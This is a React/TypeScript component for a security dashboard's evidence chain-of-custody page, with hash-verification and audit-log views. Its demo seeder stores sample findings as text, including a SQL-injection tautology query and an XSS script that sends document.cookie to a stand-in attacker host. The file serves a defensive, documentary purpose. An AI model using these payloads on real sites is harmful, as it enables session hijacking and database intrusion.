import { useState, useEffect, useMemo, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  ShieldCheck,
  ShieldAlert,
  Search,
  Sparkles,
  User,
  Fingerprint,
  Database,
  History,
  FileText,
  Key,
  Lock,
  Plus,
  RefreshCw
} from 'lucide-react';
import { PageHeader, GlassCard, AnimatedCounter } from '@/components/ui';
import {
  loadEvidence,
  verifyEvidenceIntegrity,
  logEvidenceAccess,
  createEvidenceRecord,
  logEvidenceModification,
  type EvidenceRecord,
} from '@/utils/evidenceChain';
import { useToast } from '@/hooks/useToast';

export function EvidenceCustodyPage() {
  const toast = useToast();
  const [records, setRecords] = useState<EvidenceRecord[]>([]);
  const [selectedRecordId, setSelectedRecordId] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationResult, setVerificationResult] = useState<{ valid: boolean; message: string } | null>(null);

  // Load evidence from sessionStorage
  const refreshRecords = useCallback(() => {
    const loaded = loadEvidence();
    setRecords(loaded);
    if (loaded.length > 0 && !selectedRecordId) {
      setSelectedRecordId(loaded[0].id);
    }
  }, [selectedRecordId]);

  useEffect(() => {
    refreshRecords();
  }, [refreshRecords]);

  const selectedRecord = useMemo(() => {
    return records.find(r => r.id === selectedRecordId) || null;
  }, [records, selectedRecordId]);

  // Reset verification state when selection changes
  useEffect(() => {
    setVerificationResult(null);
  }, [selectedRecordId]);

  // Filtered records
  const filteredRecords = useMemo(() => {
    return records.filter(r => {
      const q = searchQuery.toLowerCase();
      return (
        r.id.toLowerCase().includes(q) ||
        r.findingId.toLowerCase().includes(q) ||
        r.createdBy.toLowerCase().includes(q) ||
        r.data.toLowerCase().includes(q)
      );
    });
  }, [records, searchQuery]);

  // Seeder for demo data
  const handleSeedDemo = async () => {
    sessionStorage.clear(); // Clear local session to seed cleanly

    const sqlEvidence = await createEvidenceRecord(
      'finding-sql-inj-01',
      `SELECT * FROM users WHERE username = 'admin' AND password = 'blah' OR '1'='1';\n` +
      `HTTP/1.1 200 OK\n` +
      `Content-Type: application/json\n\n` +
      `{"id": 1, "username": "admin", "role": "superuser", "hash": "$2b$12$K3d..."}`,
      'sec-ops-scanner-01'
    );

    const jwtEvidence = await createEvidenceRecord(
      'finding-jwt-leak-02',
      `-----BEGIN PRIVATE KEY-----\n` +
      `MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDh4x3x9V6bX1k7\n` +
      `-----END PRIVATE KEY-----`,
      'audit-crawler'
    );

    const _xssEvidence = await createEvidenceRecord(
      'finding-xss-leak-03',
      `<script>fetch('https://attacker.site/log?c=' + document.cookie)</script>`,
      'hunter-agent'
    );

    // Simulate accesses and transfers on SQL Inject
    await logEvidenceAccess(sqlEvidence.id, 'lead-pentester-01', 'Reviewed SQL Injection database dumps');
    await logEvidenceModification(
      sqlEvidence.id,
      `SELECT * FROM users WHERE username = 'admin' AND password = 'blah' OR '1'='1';\n` +
      `HTTP/1.1 200 OK\n` +
      `[REDACTED SENSITIVE COLUMNS]\n` +
      `{"id": 1, "username": "admin", "role": "superuser"}`,
      'compliance-officer-03',
      'Masked raw database credentials for compliance audit'
    );
    await logEvidenceAccess(sqlEvidence.id, 'external-auditor-02', 'Verified masked SQL payload against logs');

    // Simulate access on JWT
    await logEvidenceAccess(jwtEvidence.id, 'ciso-admin', 'Revoked leaked private key and configured alert rules');

    refreshRecords();
    setSelectedRecordId(sqlEvidence.id);
    toast.success('Seeded cyber evidence ledger demo data!');
  };

  // Run integrity check
  const handleVerifyIntegrity = async (id: string) => {
    setIsVerifying(true);
    setVerificationResult(null);
    
    // Simulate high-security cryptographic hashing latency (400ms)
    await new Promise(resolve => setTimeout(resolve, 450));
    
    try {
      const res = await verifyEvidenceIntegrity(id);
      setVerificationResult(res);
      if (res.valid) {
        toast.success('Cryptographic verification succeeded!');
      } else {
        toast.error('Cryptographic signature alert: hash mismatch!');
      }
    } catch {
      setVerificationResult({ valid: false, message: 'Verification routine error' });
    } finally {
      setIsVerifying(false);
    }
  };

  // Simulate adding a manual audit entry
  const handleAddManualLog = async (id: string) => {
    const operator = prompt('Enter Operator Name:', 'external-compliance-inspector');
    if (!operator) return;
    const details = prompt('Enter Action Details:', 'Performed compliance check of the envelope');
    if (!details) return;

    await logEvidenceAccess(id, operator, details);
    refreshRecords();
    toast.success('Audited access log successfully recorded in ledger!');
  };

  // KPI Calculations
  const stats = useMemo(() => {
    const totalRecords = records.length;
    const totalEvents = records.reduce((sum, r) => sum + r.custodyChain.length, 0);
    const users = new Set(records.flatMap(r => r.custodyChain.map(c => c.user)));
    return {
      totalRecords,
      totalEvents,
      totalUsers: users.size
    };
  }, [records]);

  // Framer Motion variants
  const listVariants = {
    hidden: { opacity: 0 },
    visible: { opacity: 1, transition: { staggerChildren: 0.05 } }
  };

  const itemVariants = {
    hidden: { opacity: 0, x: -10 },
    visible: { opacity: 1, x: 0 }
  };

  return (
    <div className="space-y-6 max-w-7xl mx-auto p-4 md:p-6 animate-in fade-in duration-500">
      <PageHeader
        icon={<Lock size={20} className="text-accent" />}
        title="Evidence Custody Ledger"
        subtitle="Cryptographically sealed findings evidence and tamper-evident audit logs"
        actions={
          <button
            onClick={refreshRecords}
            className="btn btn-secondary flex items-center gap-2"
          >
            <RefreshCw size={14} />
            Sync Ledger
          </button>
        }
      />

      {records.length > 0 ? (
        <>
          {/* ── KPI Grid ────────────────────────────────────────────── */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <GlassCard variant="glow" delay={0.05}>
              <div className="flex items-center gap-3">
                <div className="p-2 bg-accent/10 rounded-lg text-accent">
                  <Database size={16} />
                </div>
                <div>
                  <span className="text-xs font-semibold uppercase tracking-wider text-muted block">Sealed Envelopes</span>
                  <div className="flex items-baseline gap-2">
                    <span className="text-2xl font-bold text-text">
                      <AnimatedCounter value={stats.totalRecords} />
                    </span>
                    <span className="text-[10px] text-muted uppercase font-mono">SHA-256</span>
                  </div>
                </div>
              </div>
            </GlassCard>

            <GlassCard variant="glow" delay={0.1}>
              <div className="flex items-center gap-3">
                <div className="p-2 bg-ok/10 rounded-lg text-ok">
                  <History size={16} />
                </div>
                <div>
                  <span className="text-xs font-semibold uppercase tracking-wider text-muted block">Audited Actions</span>
                  <div className="flex items-baseline gap-2">
                    <span className="text-2xl font-bold text-ok">
                      <AnimatedCounter value={stats.totalEvents} />
                    </span>
                    <span className="text-[10px] text-muted uppercase font-mono">immutable</span>
                  </div>
                </div>
              </div>
            </GlassCard>

            <GlassCard variant="glow" delay={0.15}>
              <div className="flex items-center gap-3">
                <div className="p-2 bg-accent-2/10 rounded-lg text-accent-2">
                  <User size={16} />
                </div>
                <div>
                  <span className="text-xs font-semibold uppercase tracking-wider text-muted block">Auditors & Systems</span>
                  <div className="flex items-baseline gap-2">
                    <span className="text-2xl font-bold text-accent-2">
                      <AnimatedCounter value={stats.totalUsers} />
                    </span>
                    <span className="text-[10px] text-muted uppercase font-mono">authorized</span>
                  </div>
                </div>
              </div>
            </GlassCard>
          </div>

          {/* ── Main Layout Grid ─────────────────────────────────────── */}
          <div className="grid grid-cols-1 lg:grid-cols-5 gap-6">
            
            {/* Left Column: Search and Record List */}
            <div className="lg:col-span-2 space-y-4">
              <div className="relative">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-muted" size={14} />
                <input
                  type="text"
                  placeholder="Filter by Finding ID, Operator, Payload..."
                  value={searchQuery}
                  onChange={e => setSearchQuery(e.target.value)}
                  className="w-full bg-white/5 border border-white/10 rounded-lg py-2.5 pl-10 pr-4 text-xs font-mono text-text placeholder-muted/50 focus:border-accent/40 focus:bg-white/[0.07] outline-none transition-all"
                />
              </div>

              <motion.div
                className="space-y-2 max-h-[550px] overflow-y-auto pr-1 scrollbar-cyber"
                variants={listVariants}
                initial="hidden"
                animate="visible"
              >
                {filteredRecords.map(record => {
                  const isSelected = record.id === selectedRecordId;
                  return (
                    <motion.div
                      key={record.id}
                      variants={itemVariants}
                      onClick={() => setSelectedRecordId(record.id)}
                      className={`p-3.5 rounded-xl border cursor-pointer transition-all duration-200 ${
                        isSelected
                          ? 'bg-accent/10 border-accent/40 shadow-[0_0_12px_rgba(59,130,246,0.06)]'
                          : 'bg-white/5 border-white/5 hover:border-white/10 hover:bg-white/[0.07]'
                      }`}
                    >
                      <div className="flex justify-between items-start mb-2">
                        <span className="text-[10px] font-mono text-accent bg-accent/10 px-2 py-0.5 rounded border border-accent/20">
                          {record.id.slice(0, 15)}...
                        </span>
                        <span className="text-[9px] font-mono text-muted/70">{new Date(record.createdAt).toLocaleDateString()}</span>
                      </div>
                      <h4 className="text-xs font-bold text-text mb-1 flex items-center gap-1.5 truncate">
                        <FileText size={12} className="text-muted" />
                        Finding Target: {record.findingId}
                      </h4>
                      <p className="text-[10px] font-mono text-muted/80 truncate bg-black/20 p-1.5 rounded border border-white/5">
                        {record.data.slice(0, 80)}
                      </p>
                    </motion.div>
                  );
                })}

                {filteredRecords.length === 0 && (
                  <div className="text-center text-muted/60 italic text-xs py-8 bg-white/5 rounded-xl border border-white/5">
                    No matching sealed records found.
                  </div>
                )}
              </motion.div>

              <button
                onClick={handleSeedDemo}
                className="w-full flex items-center justify-center gap-2 p-2.5 rounded-xl border border-white/5 hover:border-accent/30 text-xs font-semibold text-muted hover:text-accent bg-white/5 hover:bg-accent/5 transition-all duration-200"
              >
                <Sparkles size={14} />
                Generate Demo Records
              </button>
            </div>

            {/* Right Column: Detailed View & Custody Timeline */}
            <div className="lg:col-span-3">
              <AnimatePresence mode="wait">
                {selectedRecord ? (
                  <motion.div
                    key={selectedRecord.id}
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -10 }}
                    transition={{ duration: 0.2 }}
                    className="glass-panel p-6 rounded-2xl border border-white/5 space-y-6 relative overflow-hidden"
                  >
                    <div className="absolute top-0 right-0 w-32 h-32 bg-white/[0.01] -rotate-45 translate-x-16 -translate-y-16 pointer-events-none" />

                    {/* Record details */}
                    <div className="flex justify-between items-start flex-wrap gap-4 border-b border-white/5 pb-4">
                      <div>
                        <div className="text-[9px] font-mono text-muted uppercase tracking-widest mb-1">Evidence Envelope ID</div>
                        <h3 className="text-base font-black text-text font-mono flex items-center gap-1.5">
                          <Fingerprint size={16} className="text-accent" />
                          {selectedRecord.id}
                        </h3>
                      </div>
                      <div className="flex gap-2">
                        <button
                          onClick={() => handleAddManualLog(selectedRecord.id)}
                          className="px-3 py-1.5 text-[10px] font-bold uppercase tracking-wider bg-white/5 border border-white/10 hover:bg-white/10 text-text rounded-lg transition-all flex items-center gap-1"
                        >
                          <Plus size={12} /> Add Access Log
                        </button>
                        <button
                          onClick={() => handleVerifyIntegrity(selectedRecord.id)}
                          disabled={isVerifying}
                          className="px-3 py-1.5 text-[10px] font-bold uppercase tracking-wider bg-accent hover:bg-white text-black rounded-lg transition-all flex items-center gap-1.5 shadow-[0_0_12px_rgba(59,130,246,0.2)] disabled:opacity-50"
                        >
                          {isVerifying ? (
                            <RefreshCw size={12} className="animate-spin" />
                          ) : (
                            <ShieldCheck size={12} />
                          )}
                          Verify Seal
                        </button>
                      </div>
                    </div>

                    {/* Verification Result Banner */}
                    <AnimatePresence>
                      {verificationResult && (
                        <motion.div
                          initial={{ opacity: 0, scale: 0.95 }}
                          animate={{ opacity: 1, scale: 1 }}
                          exit={{ opacity: 0, scale: 0.95 }}
                          className={`p-3.5 rounded-xl border flex items-center gap-3 shadow-lg ${
                            verificationResult.valid
                              ? 'bg-ok/10 border-ok/30 text-ok'
                              : 'bg-bad/10 border-bad/30 text-bad'
                          }`}
                        >
                          {verificationResult.valid ? (
                            <ShieldCheck size={18} className="text-ok animate-pulse" />
                          ) : (
                            <ShieldAlert size={18} className="text-bad animate-bounce" />
                          )}
                          <div className="flex-1 text-xs">
                            <strong className="block uppercase tracking-wider mb-0.5">
                              {verificationResult.valid ? 'Seal Cryptographically Verified' : 'Security Alert: Tamper Warning'}
                            </strong>
                            <span className="opacity-80 font-mono text-[10px] block truncate">
                              SHA-256 Hash matches vault manifest: {selectedRecord.hash}
                            </span>
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>

                    {/* Data payload display */}
                    <div className="space-y-2">
                      <span className="text-[10px] font-mono text-muted uppercase tracking-widest block">Evidence Payload</span>
                      <pre className="bg-black/40 border border-white/5 p-4 rounded-xl font-mono text-[11px] text-text/90 overflow-x-auto whitespace-pre-wrap max-h-48 scrollbar-cyber leading-relaxed">
                        {selectedRecord.data}
                      </pre>
                    </div>

                    {/* Custody chain timeline */}
                    <div className="space-y-4">
                      <h4 className="text-xs font-bold uppercase tracking-widest text-text flex items-center gap-1.5">
                        <History size={14} className="text-accent" />
                        Tamper-Evident Chain of Custody
                      </h4>

                      <div className="relative pl-6 border-l border-white/10 space-y-6">
                        {selectedRecord.custodyChain.map((entry) => {
                          const actionColors: Record<string, string> = {
                            created: 'text-ok bg-ok/10 border-ok/30',
                            accessed: 'text-accent bg-accent/10 border-accent/30',
                            modified: 'text-warn bg-warn/10 border-warn/30',
                            exported: 'text-accent-2 bg-accent-2/10 border-accent-2/30',
                            deleted: 'text-bad bg-bad/10 border-bad/30'
                          };

                          const colorClass = actionColors[entry.action] || 'text-muted bg-white/5 border-white/10';

                          return (
                            <div key={entry.id} className="relative group">
                              
                              {/* Timeline indicator node */}
                              <div className={`absolute -left-[31px] top-1.5 w-4 h-4 rounded-full border-2 border-bg grid place-items-center ${colorClass}`}>
                                <div className="w-1.5 h-1.5 rounded-full bg-current" />
                              </div>

                              {/* Content box */}
                              <div className="bg-white/[0.02] border border-white/5 rounded-xl p-3 hover:bg-white/[0.04] hover:border-white/10 transition-colors">
                                <div className="flex justify-between items-center mb-1 flex-wrap gap-2">
                                  <div className="flex items-center gap-1.5">
                                    <span className={`text-[8px] font-black uppercase tracking-wider px-2 py-0.5 rounded border ${colorClass}`}>
                                      {entry.action}
                                    </span>
                                    <span className="text-[10px] font-semibold text-text flex items-center gap-1">
                                      <User size={10} className="text-muted" />
                                      {entry.user}
                                    </span>
                                  </div>
                                  <span className="text-[9px] font-mono text-muted/70">
                                    {new Date(entry.timestamp).toLocaleString()}
                                  </span>
                                </div>
                                <p className="text-xs text-muted/80 leading-relaxed mb-2 text-left">{entry.details}</p>
                                
                                {entry.hashAfter && (
                                  <div className="flex items-center gap-1 font-mono text-[9px] text-muted/60 bg-black/20 px-2 py-1 rounded border border-white/5 w-fit max-w-full">
                                    <Key size={10} className="text-accent flex-shrink-0" />
                                    <span className="truncate">Sealed Hash: {entry.hashAfter.slice(0, 18)}...</span>
                                  </div>
                                )}
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    </div>
                  </motion.div>
                ) : (
                  <div className="h-full flex items-center justify-center border border-white/5 rounded-2xl bg-white/[0.02] p-8 text-center text-muted/60 italic text-xs">
                    Select an evidence envelope from the list to view its complete audit chain.
                  </div>
                )}
              </AnimatePresence>
            </div>

          </div>
        </>
      ) : (
        /* ── Empty State / Seeder ─────────────────────────────────── */
        <GlassCard variant="glow" className="py-16 max-w-xl mx-auto text-center space-y-6">
          <div className="h-16 w-16 mx-auto rounded-full bg-accent/10 border border-accent/30 flex items-center justify-center text-accent shadow-[0_0_20px_rgba(59,130,246,0.15)] animate-pulse">
            <Lock size={32} />
          </div>
          <div className="space-y-2">
            <h3 className="text-base font-black uppercase tracking-wider text-text">No Evidence Envelopes</h3>
            <p className="text-xs text-muted/80 max-w-md mx-auto leading-relaxed text-center">
              The cryptographic chain of custody ledger is empty in this session. Initialize the secure demo registry to populate the tamper-evident audit journal.
            </p>
          </div>
          <button
            onClick={handleSeedDemo}
            className="btn btn-primary px-6 py-2.5 text-xs font-bold uppercase tracking-wider bg-accent text-black rounded-lg hover:bg-white hover:text-black transition-all flex items-center gap-2 mx-auto shadow-[0_0_15px_rgba(59,130,246,0.25)]"
          >
            <Sparkles size={14} />
            Initialize Demo Ledger
          </button>
        </GlassCard>
      )}
    </div>
  );
}
